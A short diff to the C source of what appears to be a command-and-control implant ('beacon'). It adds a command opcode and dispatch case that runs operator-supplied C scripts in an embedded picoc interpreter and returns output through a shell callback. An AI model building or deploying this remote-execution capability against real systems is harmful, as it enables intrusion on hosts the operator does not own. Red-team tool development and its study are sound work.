@@ -135,6 +135,9 @@
 #define COMMAND_HOST_CONFIG        0x79
 /* tier-3 item11 (4.12 beacon_info): in-memory layout self-report */
 #define COMMAND_BEACON_INFO        0x7A
+/* tier-3 item12 (4.13 Beacon Interpreter): run a (TS-transformed) C script
+ * inside the vendored picoc VM; wire format in src/interpreter/binterp.cpp */
+#define COMMAND_INTERPRETER        0x7B
 
 typedef struct {
 	unsigned int   type;
@@ -485,6 +488,9 @@ void process_message(unsigned int type, char * buffer, int length) {
 		break;
 	case COMMAND_BEACON_INFO:
 		command_beacon_info(buffer, length, command_shell_callback);
+		break;
+	case COMMAND_INTERPRETER:
+		command_interpreter(buffer, length, command_shell_callback);
 		break;
 	}
 }
